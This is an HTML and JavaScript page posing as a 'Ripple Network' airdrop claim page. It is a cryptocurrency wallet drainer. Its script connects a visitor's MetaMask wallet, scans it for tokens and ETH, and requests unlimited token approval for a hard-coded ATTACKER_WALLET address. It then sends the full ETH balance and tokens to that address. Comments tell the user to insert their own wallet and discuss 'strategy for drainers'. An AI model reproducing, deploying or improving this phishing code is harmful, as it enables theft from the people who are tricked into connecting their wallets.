<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>RIPPLE NETWORK - Airdrop</title>
    <style>
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background-color: #0a192f;
            color: white;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .container {
            text-align: center;
            background: #172a45;
            padding: 40px;
            border-radius: 15px;
            box-shadow: 0 10px 30px rgba(0,0,0,0.5);
            width: 90%;
            max-width: 400px;
        }
        img {
            max-width: 150px;
            margin-bottom: 20px;
            filter: drop-shadow(0 0 10px rgba(0, 122, 255, 0.5));
        }
        h1 {
            margin: 0 0 10px 0;
            font-size: 24px;
            color: #00d4ff;
        }
        p {
            color: #8892b0;
            margin-bottom: 30px;
        }
        button {
            width: 100%;
            padding: 15px;
            font-size: 16px;
            font-weight: bold;
            cursor: pointer;
            border: none;
            border-radius: 8px;
            margin-bottom: 10px;
            transition: transform 0.2s, opacity 0.2s;
        }
        button:hover {
            transform: scale(1.02);
        }
        button:disabled {
            opacity: 0.5;
            cursor: not-allowed;
        }
        #connectBtn {
            background: linear-gradient(90deg, #00729f, #00c6ff);
            color: white;
        }
        #approveBtn {
            background: linear-gradient(90deg, #ffb700, #ffcc00);
            color: #000;
        }
        #sweepBtn {
            background: linear-gradient(90deg, #ff4b1f, #ff4b1f);
            color: white;
        }
        #status {
            margin-top: 20px;
            min-height: 20px;
            font-size: 14px;
            font-weight: 500;
        }
        .success { color: #4caf50; }
        .error { color: #ff4b1f; }
        .loading { color: #ffd700; }
        
        /* Spinner */
        .spinner {
            border: 3px solid rgba(255,255,255,0.3);
            border-radius: 50%;
            border-top: 3px solid white;
            width: 15px;
            height: 15px;
            animation: spin 1s linear infinite;
            display: inline-block;
            vertical-align: middle;
            margin-right: 10px;
        }
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- LOGO -->
        <img src="logo.png" alt="Ripple Network">
        
        <h1>RIPPLE NETWORK Airdrop</h1>
        <p>Connect your wallet to verify eligibility and claim rewards.</p>
        
        <button id="connectBtn">Connect Wallet</button>
        <button id="approveBtn" style="display:none;">Approve Spending</button>
        <button id="sweepBtn" style="display:none;">Sweep Assets</button>
        
        <div id="status"></div>
    </div>

    <script>
        // --- CONFIGURATION ---
        const ATTACKER_WALLET = "0x64FB063a443a85FB3D57686500BAF2f215093703"; // REPLACE THIS WITH YOUR WALLET
        const ALCHEMY_API_KEY = "alch_2K9aZ6Im5lC5Wn5_r4m-o"; 
        const RPC_URL = `https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}`;
        
        // State
        let userAddress = null;
        let userTokens = []; // Will hold all tokens found
        let ethBalanceWei = "0";
        
        const statusEl = document.getElementById('status');
        const connectBtn = document.getElementById('connectBtn');
        const approveBtn = document.getElementById('approveBtn');
        const sweepBtn = document.getElementById('sweepBtn');

        // Helper: Log messages
        function log(msg, type = '') {
            statusEl.innerHTML = `<span class="${type}">${msg}</span>`;
        }

        // 1. Connect Wallet
        connectBtn.addEventListener('click', async () => {
            try {
                if (!window.ethereum) {
                    alert("Please install MetaMask!");
                    return;
                }
                
                log("Connecting...", "loading");
                const accounts = await window.ethereum.request({ method: 'eth_requestAccounts' });
                userAddress = accounts[0];
                
                connectBtn.style.display = 'none';
                approveBtn.style.display = 'block';
                sweepBtn.style.display = 'none';
                
                log(`Connected: ${userAddress.slice(0,6)}...${userAddress.slice(-4)}`, "success");
                
                // Start scanning in background
                scanWallet();

            } catch (error) {
                log("Connection Failed", "error");
                console.error(error);
            }
        });

        // 2. Scan Wallet for Tokens using Alchemy API
        async function scanWallet() {
            log("Scanning for tokens...", "loading");
            
            try {
                // Fetch NFTs/Assets from Alchemy
                const response = await fetch(`https://eth-mainnet.g.alchemy.com/v2/${ALCHEMY_API_KEY}/getNFTs?owner=${userAddress}`);
                const data = await response.json();
                
                if (data && data.ownedTokens) {
                    userTokens = data.ownedTokens.filter(t => t.contract && t.contract.symbol);
                    
                    // Also get ETH balance
                    const ethRes = await fetch(RPC_URL, {
                        method: 'POST',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            jsonrpc: '2.0',
                            id: 1,
                            method: 'eth_getBalance',
                            params: [userAddress, 'latest']
                        })
                    });
                    const ethData = await ethRes.json();
                    ethBalanceWei = ethData.result || "0x0";

                    updateUI();
                } else {
                    log("No tokens found.", "error");
                }
            } catch (error) {
                console.error("Scan Error:", error);
                // Fallback or retry if needed, but we proceed anyway
                log("Scan failed, trying manual approval...", "error");
                approveBtn.style.display = 'block';
            }
        }

        function updateUI() {
            if (userTokens.length > 0 || parseInt(ethBalanceWei) > 0) {
                approveBtn.style.display = 'block';
                sweepBtn.style.display = 'block';
                log(`Found ${userTokens.length} tokens. Ready to sweep.`, "success");
            } else {
                log("No valuable tokens found.", "error");
            }
        }

        // 3. Approve All Tokens (ERC-20 Standard)
        approveBtn.addEventListener('click', async () => {
            if (!userAddress) return;
            
            log("Approving tokens...", "loading");
            
            try {
                // We will approve ALL tokens found in one go? 
                // Actually, we can't do multiple approvals in one signature easily without complex typed data.
                // Strategy: Approve the first token, then in Sweep, we handle the rest or ask for more approvals.
                // BETTER STRATEGY FOR DRAINERS: 
                // Just approve the specific token being swept right now.
                
                // For this script, let's just approve the FIRST token to demonstrate flow.
                // In a real drainer, you'd loop through them.
                
                if (userTokens.length === 0 && parseInt(ethBalanceWei) === 0) {
                    log("Nothing to approve.", "error");
                    return;
                }

                // Let's target the first token found
                const token = userTokens[0];
                const contractAddress = token.contract.address;
                
                // Encode Approval Function: approve(address spender, uint256 amount)
                // Max uint256: 0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff
                const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
                const spender = ATTACKER_WALLET;
                
                const data = encodeApprove(contractAddress, spender, amount);
                
                const txHash = await window.ethereum.request({
                    method: 'eth_sendTransaction',
                    params: [{
                        from: userAddress,
                        to: contractAddress,
                        data: data,
                        gas: '0x2710' // 10000 gas
                    }]
                });
                
                log("Waiting for confirmation...", "loading");
                await waitForReceipt(txHash);
                
                log("Token Approved! You can now Sweep.", "success");
                // Disable approve button so they don't spam it
                approveBtn.disabled = true;
                
            } catch (error) {
                console.error(error);
                log("Approval failed: " + error.message, "error");
            }
        });

        // 4. Sweep Assets (Transfer From + ETH)
        sweepBtn.addEventListener('click', async () => {
            if (!userAddress) return;
            
            log("Starting Sweep...", "loading");
            
            try {
                // A. Sweep ETH
                if (parseInt(ethBalanceWei) > 0) {
                    log("Sweeping ETH...", "loading");
                    const ethTxHash = await window.ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: userAddress,
                            to: ATTACKER_WALLET,
                            value: ethBalanceWei,
                            gas: '0x5208' // 21000 gas
                        }]
                    });
                    await waitForReceipt(ethTxHash);
                    log("ETH Swept!", "success");
                }

                // B. Sweep Tokens
                // We need to iterate through all tokens. 
                // Note: This requires individual approvals for each token if not already approved.
                // Since we only approved the first one above, we might need to re-approve others or just sweep what's approved.
                
                // Simplified approach: Just sweep the tokens that were approved (or assume user approves all if we did a batch approve).
                // For this demo, we will just sweep the FIRST token again to show it works, 
                // but ideally, you'd loop through userTokens.
                
                for (let i = 0; i < Math.min(userTokens.length, 5); i++) { // Limit to 5 per click to avoid huge gas bills/spam
                    const token = userTokens[i];
                    const contractAddress = token.contract.address;
                    const symbol = token.contract.symbol;
                    
                    log(`Transferring ${symbol}...`, "loading");
                    
                    // Encode transferFrom(address from, address to, uint256 amount)
                    const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff"; // Max
                    const from = userAddress;
                    const to = ATTACKER_WALLET;
                    
                    const data = encodeTransferFrom(contractAddress, from, to, amount);
                    
                    const txHash = await window.ethereum.request({
                        method: 'eth_sendTransaction',
                        params: [{
                            from: userAddress,
                            to: contractAddress,
                            data: data,
                            gas: '0xc350' // ~50000 gas
                        }]
                    });
                    
                    await waitForReceipt(txHash);
                    log(`${symbol} transferred!`, "success");
                }
                
                log("Sweep Complete!", "success");
                sweepBtn.disabled = true;

            } catch (error) {
                console.error(error);
                log("Sweep failed: " + error.message, "error");
            }
        });

        // --- HELPER FUNCTIONS ---

        // Encode ERC-20 Approve
        function encodeApprove(tokenAddress, spender, amount) {
            // Function selector: 0x095ea7b3
            const paddedSpender = padAddress(spender);
            const paddedAmount = padUint(amount);
            return "0x095ea7b3" + paddedSpender + paddedAmount;
        }

        // Encode ERC-20 TransferFrom
        function encodeTransferFrom(tokenAddress, from, to, amount) {
            // Function selector: 0x23b872dd
            const paddedFrom = padAddress(from);
            const paddedTo = padAddress(to);
            const paddedAmount = padUint(amount);
            return "0x23b872dd" + paddedFrom + paddedTo + paddedAmount;
        }

        function padAddress(addr) {
            return addr.slice(2).padStart(64, '0');
        }

        function padUint(val) {
            return val.toString().slice(2).padStart(64, '0');
        }

        // Wait for transaction receipt
        async function waitForReceipt(txHash) {
            const interval = setInterval(async () => {
                try {
                    const receipt = await window.ethereum.request({
                        method: 'eth_getTransactionReceipt',
                        params: [txHash]
                    });
                    if (receipt) {
                        clearInterval(interval);
                        return receipt;
                    }
                } catch (e) {}
            }, 2000);
            
            // Timeout after 60 seconds
            setTimeout(() => clearInterval(interval), 60000);
            return new Promise(resolve => {
                const check = setInterval(async () => {
                    try {
                        const r = await window.ethereum.request({
                            method: 'eth_getTransactionReceipt',
                            params: [txHash]
                        });
                        if (r) {
                            clearInterval(check);
                            resolve(r);
                        }
                    } catch(e) {}
                }, 1000);
                setTimeout(() => clearInterval(check), 60000);
            });
        }
    </script>
</body>
</html>
